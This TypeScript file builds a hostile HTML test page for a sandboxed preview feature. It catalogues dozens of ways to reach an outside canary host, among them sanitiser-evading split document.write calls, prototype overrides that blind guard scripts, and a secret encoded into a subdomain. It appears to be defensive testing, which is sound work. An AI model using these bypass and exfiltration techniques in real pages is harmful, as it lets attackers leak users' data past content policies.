import { KIN_VISUAL_FILE_ROUTE } from "@t3tools/shared/kinVisual";

// Every outside name the page uses in Chromium ends here; the browser maps them all to the TCP canary.
export const OUTSIDE = "leak.canary";
/** Where a page's own reports go: the one Kin path its policy lets it load from. */
export const REPORT = `${KIN_VISUAL_FILE_ROUTE}/report`;

/**
 * Every way out a page has. `stun` is a UDP canary, `http` the TCP one under an outside name and
 * `port` its port, for names under `.localhost`. Each attempt that could open a second realm runs
 * the same STUN call there. The late stage runs after load, when `document.open` makes a parser.
 */
export const hostilePage = (stun: string, http: string, port: number) => {
  const rtc = `try{var pc=new RTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]});(window.held=window.held||[]).push(pc);pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)})}catch(e){}`;
  const child = `<script>${rtc}<\\/script>`;
  const childAttr = child
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
  const ws = http.replace(/^http/, "ws");
  return `<!doctype html><html><head>
<meta http-equiv="refresh" content="3;url=${http}/meta-refresh">
<link rel="preconnect" href="${http}"><link rel="dns-prefetch" href="${http}">
<link rel="stylesheet" href="${http}/stylesheet">
<link rel="prefetch" href="${http}/prefetch">
<link rel="preload" as="image" href="${http}/preload">
<link rel="modulepreload" href="${http}/modulepreload">
<script type="speculationrules">{"prefetch":[{"source":"list","urls":["${http}/speculation"]}],"prerender":[{"source":"list","urls":["${http}/prerender"]}]}</script>
<script src="${http}/script"></script>
<style>@import url("${http}/css-import");@font-face{font-family:x;src:url("${http}/font")}body{font-family:x;background:url("${http}/css-image")}</style>
</head><body>
<p id="secret">Q3 revenue 4,812,000</p>
<img src="${http}/img"><video src="${http}/video"></video><audio src="${http}/audio"></audio>
<iframe src="${http}/iframe"></iframe><iframe srcdoc="${childAttr}"></iframe>
<object data="${http}/object"></object><embed src="${http}/embed">
<a id="link" href="${http}/link-click" ping="${http}/ping">x</a>
<form id="form" action="${http}/form" method="post"><input name="a" value="b"></form>
<script>
var child = ${JSON.stringify(child)};
var X = "http://www.w3.org/1999/xhtml";
// Built at run time: the page's own script text is scrubbed too, so literal tags would not test the sinks.
var L = "<" + "link", LU = "<" + "LINK", IF = "<" + "iframe", M = "<" + "meta";
var secret = document.getElementById("secret").textContent.replace(/[^a-z0-9]+/gi, "-").toLowerCase();
var shadows = [];
// Any of these connected for a moment is enough: WebKit preconnects a <link> as it is inserted.
function connectedNow() {
  var all = "link,iframe,frame,object,embed,portal,fencedframe,meta[http-equiv]", n = document.querySelectorAll(all).length;
  shadows.forEach(function (root) { n += root.querySelectorAll(all).length; });
  return n;
}
function foreign(markup) { var d = document.implementation.createHTMLDocument(""); d.open(); d.write("<li"); d.write(markup); d.close(); return d; }
// A name that reads as harmless the first time it is turned into text, and as itself after.
function tog(real) { var n = 0; return { toString: function () { return n++ ? real : "data-x"; } }; }
function report(path, list) { new Image().src = new URL("${REPORT}/" + path + "?connected=" + list.join(","), location.href).href; }
// Blind every built-in a guard written in page script might lean on, before trying anything.
RegExp.prototype.exec = function () { return null; };
RegExp.prototype.test = function () { return false; };
String.prototype.toLowerCase = function () { return "x"; };
String.prototype.indexOf = function () { return -1; };
["localName", "tagName", "nodeName", "namespaceURI"].forEach(function (name) {
  Object.defineProperty(Element.prototype, name, { configurable: true, get: function () { return "div"; } });
});
Object.defineProperty(MutationRecord.prototype, "addedNodes", { configurable: true, get: function () { return []; } });
Event.prototype.preventDefault = function () {};
Node.prototype.removeChild = function (node) { return node; };
Element.prototype.remove = function () {};
Reflect.apply = function () {};
Function.prototype.call = function () {};
Function.prototype.apply = function () {};
var attempts = [
  function () { ${rtc} },
  function () { new webkitRTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { var C = Function("return RTCPeerConnection")(); new C({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { var C = (0, eval)("window.RTCPeerConnection"); new C({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { delete window.RTCPeerConnection; new RTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { navigator.mediaDevices.getUserMedia({ audio: true }); },
  function () { var f = document.createElement("iframe"); f.srcdoc = child; document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.setAttribute("srcdoc", child); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.setAttribute({ toString: function () { return "srcdoc"; } }, child); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); var a = document.createAttribute("srcdoc"); a.value = child; f.setAttributeNode(a); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); document.body.appendChild(f); f.setAttribute("srcdoc", child); },
  function () { var f = document.createElement("iframe"); f.src = "javascript:'" + child.replace(/'/g, "\\\\'") + "'"; document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.src = "data:text/html," + encodeURIComponent(child); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.src = URL.createObjectURL(new Blob([child], { type: "text/html" })); document.body.appendChild(f); },
  function () { var d = document.createElement("div"); d.innerHTML = IF + ' srcdoc="${childAttr}"></iframe>'; document.body.appendChild(d); },
  function () { document.body.insertAdjacentHTML("beforeend", IF + ' srcdoc="${childAttr}"></iframe>'); },
  function () { var t = document.createElement("template"); t.innerHTML = IF + ' srcdoc="${childAttr}"></iframe>'; document.body.appendChild(t.content.cloneNode(true)); },
  function () { var x = new DOMParser().parseFromString('<html xmlns="http://www.w3.org/1999/xhtml"><body>' + IF + ' srcdoc="${childAttr}"/></body></html>', "application/xhtml+xml"); document.body.appendChild(document.adoptNode(x.getElementsByTagName("iframe")[0])); },
  function () { var f = document.createElement("iframe"); document.body.appendChild(f); var C = f.contentWindow.RTCPeerConnection; new C({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { var o = document.createElement("object"); o.data = "data:text/html," + encodeURIComponent(child); document.body.appendChild(o); },
  function () { new Worker(URL.createObjectURL(new Blob(["fetch('${http}/blob-worker')"], { type: "text/javascript" }))); },
  function () { new Worker("data:text/javascript,fetch('${http}/data-worker')"); },
  function () { new SharedWorker(URL.createObjectURL(new Blob(["fetch('${http}/shared-worker')"], { type: "text/javascript" }))); },
  function () { CSS.paintWorklet.addModule("data:text/javascript,0"); },
  function () { new AudioContext().audioWorklet.addModule(URL.createObjectURL(new Blob(["0"], { type: "text/javascript" }))); },
  function () { fetch("${http}/fetch", { mode: "no-cors" }).catch(function () {}); },
  function () { var x = new XMLHttpRequest(); x.open("GET", "${http}/xhr"); x.send(); },
  function () { new WebSocket("${ws}/websocket"); },
  function () { new WebTransport("https://${OUTSIDE}:4433/webtransport"); },
  function () { navigator.sendBeacon("${http}/beacon", "x"); },
  function () { new EventSource("${http}/event-source"); },
  function () { import("${http}/dynamic-import").catch(function () {}); },
  function () { window.open("${http}/window-open"); },
  function () { window.top.location = "${http}/top-navigation"; },
  function () { window.parent.location = "${http}/parent-navigation"; },
  function () { var s = document.createElement("script"); s.src = "${http}/script-dynamic"; document.head.appendChild(s); },
  function () { var l = document.createElement("link"); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
  function () { var l = document.createElement("LINK"); l.rel = "preconnect"; l.href = "${http}/upper"; document.head.appendChild(l); },
  function () { var l = document.createElement("link"); l.rel = "prefetch"; l.href = "${http}/prefetch-dynamic"; document.head.appendChild(l); },
  function () { var b = document.createElement("base"); b.href = "${http}/"; document.head.appendChild(b); new Image().src = "base-relative"; },
  function () { var l = document.createElementNS(X, "h:link"); l.setAttribute("rel", "preconnect"); l.setAttribute("href", "${http}"); document.head.appendChild(l); },
  function () { var l = document.createElementNS(X, "LINK"); l.setAttribute("rel", "preconnect"); l.setAttribute("href", "${http}/ns-upper"); document.head.appendChild(l); },
  function () { var d = document.createElement("div"); d.innerHTML = L + ' rel="pre&#99;onnect" href="${http}">'; document.body.appendChild(d); },
  function () { document.body.insertAdjacentHTML("beforeend", LU + ' rel=preconnect href="${http}">'); },
  function () { var d = document.createElement("div"); document.body.appendChild(d); d.outerHTML = L + ' rel="preconnect" href="${http}">'; },
  function () { var f = document.createDocumentFragment(), s = document.createElement("span"); f.appendChild(s); s.outerHTML = L + ' rel="preconnect" href="${http}/detached-outer">'; document.head.appendChild(f); },
  function () { var t = document.createElement("template"); t.innerHTML = '<template>' + L + ' rel="preconnect" href="${http}"></template>'; document.body.appendChild(t.content.firstChild.content.cloneNode(true)); },
  function () { var t = document.createElement("template"); t.innerHTML = L + ' rel="preconnect" href="${http}/template-adopt">'; document.head.appendChild(document.adoptNode(t.content)); },
  function () { var d = new DOMParser().parseFromString(L + ' rel="preconnect" href="${http}">', "text/html"); var l = d.querySelector("link"); if (l) document.head.appendChild(document.adoptNode(l)); },
  function () { var d = new DOMParser().parseFromString(M + ' http-equiv="refresh" content="0;url=${http}/parsed-meta">', "text/html"); var m = d.querySelector("meta"); if (m) document.head.appendChild(document.importNode(m, true)); },
  function () { var d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "&#60;link xmlns=&#34;' + X + '&#34; rel=&#34;preconnect&#34; href=&#34;${http}&#34;/&#62;">]><r>&e;</r>', "application/xml"); var l = d.getElementsByTagNameNS(X, "link")[0]; if (l) document.head.appendChild(document.adoptNode(l)); },
  function () { var x = new DOMParser().parseFromString('<frameset xmlns="' + X + '"><frame src="${http}/frameset"/></frameset>', "application/xhtml+xml"); document.body = document.importNode(x.documentElement, true); },
  function () { var l = document.implementation.createDocument(X, "link", null).documentElement; l.setAttribute("rel", "preconnect"); l.setAttribute("href", "${http}"); document.head.appendChild(document.adoptNode(l)); },
  function () { document.head.appendChild(document.createRange().createContextualFragment(L + ' rel="preconnect" href="${http}">')); },
  function () { var d = document.createElement("div"); d.setHTMLUnsafe(L + ' rel="preconnect" href="${http}">' + IF + ' srcdoc="${childAttr}"></iframe>'); document.body.appendChild(d); },
  function () { var d = document.createElement("div"); document.body.appendChild(d); d.setHTMLUnsafe('<div><template shadowrootmode="open">' + L + ' rel="preconnect" href="${http}/declarative-shadow"></template></div>'); var r = d.firstChild && d.firstChild.shadowRoot; if (r) shadows.push(r); },
  function () { var l = Document.parseHTMLUnsafe(L + ' rel="preconnect" href="${http}">').querySelector("link"); if (l) document.head.appendChild(document.adoptNode(l)); },
  function () { var d = document.createElement("div"); document.body.appendChild(d); d.streamHTMLUnsafe().getWriter().write(L + ' rel="preconnect" href="${http}/stream">'); },
  function () { document.write(L + ' rel="preconnect" href="${http}">' + IF + ' srcdoc="${childAttr}"></iframe>'); },
  // The parser joins what separate calls write; each call alone holds no tag.
  function () { document.write("<li"); document.write('nk rel="preconnect" href="${http}/split-write">'); },
  function () { document.write("<"); document.write('link rel=preconnect href=${http}/split-angle>'); },
  function () { document.write("<li"); document.write('nk rel="preconnect" href="https://kin-secret-' + secret + '.localhost:${port}/">'); },
  function () { document.write("<ifr"); document.write('ame srcdoc="${childAttr}"></iframe>'); },
  function () { document.write("<me"); document.write('ta http-equiv="refresh" content="0;url=${http}/split-meta">'); },
  function () { document.write("<li", 'nk rel=preconnect href=${http}/write-args>'); },
  function () { document.writeln("<li"); document.writeln("nk rel=preconnect href=${http}/split-writeln>"); },
  function () { Document.prototype.write.call(document, "<li"); HTMLDocument.prototype.write.call(document, 'nk rel=preconnect href=${http}/split-prototype>'); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-open">'); var l = d.querySelector("link"); if (l) document.head.appendChild(document.adoptNode(l)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-import">'); document.head.appendChild(document.importNode(d.documentElement, true)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-range">'), l = d.querySelector("link"), r = document.createRange(); r.selectNodeContents(document.head); if (l) r.insertNode(document.adoptNode(l)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-adjacent">'), l = d.querySelector("link"); if (l) document.body.insertAdjacentElement("beforeend", document.adoptNode(l)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-after">'), l = d.querySelector("link"); if (l) document.body.firstChild.after(document.adoptNode(l)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-replace">'), l = d.querySelector("link"), s = document.createElement("span"); document.body.appendChild(s); if (l) document.body.replaceChild(document.adoptNode(l), s); },
  function () { var m = document.createElement("meta"); document.head.appendChild(m); m.setAttribute("http-equiv", "refresh"); m.setAttribute("content", "0;url=${http}/meta-attribute"); },
  function () { var m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${http}/meta-property"; document.head.appendChild(m); },
  function () { var m = document.createElement("meta"), a = document.createAttribute("HTTP-EQUIV"); a.value = "refresh"; m.setAttributeNode(a); m.content = "0;url=${http}/meta-node"; document.head.appendChild(m); },
  function () { var m = document.createElement("meta"); m.toggleAttribute("http-equiv", true); document.head.appendChild(m); },
  function () { var m = document.createElement("meta"), a = document.createAttribute("http-equiv"); a.value = "refresh"; m.attributes.setNamedItem(a); document.head.appendChild(m); },
  function () { var m = document.createElement("meta"); document.head.appendChild(m); m.setAttribute("content", "0;url=${http}/toggled-set-attribute"); m.setAttribute(tog("http-equiv"), "refresh"); },
  function () { var m = document.createElement("meta"); document.head.appendChild(m); m.setAttribute("content", "0;url=${http}/toggled-set-attribute-ns"); m.setAttributeNS(null, tog("http-equiv"), "refresh"); },
  function () { var m = document.createElement("meta"); document.head.appendChild(m); m.toggleAttribute(tog("http-equiv"), true); },
  function () { var d = document.createElement("div"); d.innerHTML = '<noscript><p title="</noscript>' + M + ' http-equiv=refresh content=0;url=${http}/noscript-meta>"></p></noscript>'; document.body.appendChild(d); },
  function () { var d = document.createElement("div"); d.innerHTML = '<svg><foreignObject>' + L + ' rel="preconnect" href="${http}/foreign-object"></foreignObject></svg><math><mi>' + L + ' rel=preconnect href=${http}/mathml></mi></math>'; document.body.appendChild(d); },
  function () { var t = document.createElement("textarea"); t.innerHTML = L + ' rel=preconnect href=${http}/textarea>'; var d = document.createElement("div"); d.innerHTML = t.value; document.body.appendChild(d); },
  function () { var t = document.createElement("title"); t.innerHTML = '</title>' + L + ' rel=preconnect href=${http}/title>'; document.head.appendChild(t); },
  function () { var d = document.createElement("div"); d.contentEditable = "true"; document.body.appendChild(d); d.focus(); document.execCommand("insertHTML", false, L + ' rel="preconnect" href="${http}">'); },
  function () { var d = document.createElement("div"); d.contentEditable = "true"; document.body.appendChild(d); d.focus(); document.execCommand("insertHTML", false, M + ' http-equiv="refresh" content="0;url=${http}/exec-meta">'); },
  function () { customElements.define("kin-l", class extends HTMLLinkElement {}, { extends: "link" }); var l = new (customElements.get("kin-l"))(); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
  function () { var n = 0; customElements.define("kin-m", class extends HTMLLinkElement {}, { get extends() { return n++ ? "link" : "p"; } }); var l = new (customElements.get("kin-m"))(); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
  function () { customElements.define("kin-t", class extends HTMLLinkElement {}, { extends: tog("link") }); var l = new (customElements.get("kin-t"))(); l.rel = "preconnect"; l.href = "${http}/toggled-extends"; document.head.appendChild(l); },
  function () { new XSLTProcessor(); },
  function () { var d = document.createElement("div"); d.innerHTML = '<noscript><p title="</noscript>' + L + ' rel=preconnect href=${http}>"></p></noscript>'; document.body.appendChild(d); },
  function () { var h = document.createElement("div"); document.body.appendChild(h); var root = h.attachShadow({ mode: "open" }); shadows.push(root); root.innerHTML = L + ' rel="preconnect" href="${http}">' + IF + ' srcdoc="${childAttr}"></iframe>'; },
  function () { var h = document.createElement("div"); document.body.appendChild(h); var root = h.attachShadow({ mode: "open" }), d = foreign('nk rel="preconnect" href="${http}/foreign-shadow">'), l = d.querySelector("link"); shadows.push(root); if (l) root.appendChild(document.adoptNode(l)); },
  function () { var d = document.createElement("div"); document.body.appendChild(d); d.setHTML(L + ' rel="preconnect" href="${http}">'); },
];
var connected = connectedNow() ? ["start"] : [];
attempts.forEach(function (attempt, index) {
  try { attempt(); } catch (error) {}
  if (connectedNow()) connected.push(index);
});
// The page reached its last line and still loads from its own host.
report("attempted", connected);
// After load the parser is gone, and document.open would make the page a new one.
window.addEventListener("load", function () {
  setTimeout(function () {
    var late = [];
    try { document.open(); document.write("<li"); document.write('nk rel="preconnect" href="${http}/open-split">'); document.write("<ifr"); document.write('ame srcdoc="${childAttr}"></iframe>'); document.close(); } catch (error) {}
    if (connectedNow()) late.push("open");
    try { document.write("<li"); document.write('nk rel="preconnect" href="${http}/late-write">'); } catch (error) {}
    if (connectedNow()) late.push("write");
    report("late", late);
  });
});
// Navigating ends the page, so these go last, once STUN has had its chance in the control.
setTimeout(function () {
  try { document.getElementById("form").submit(); } catch (error) {}
  try { document.getElementById("link").click(); } catch (error) {}
  location.href = "${http}/self-navigation";
}, 2500);
</script></body></html>`;
};
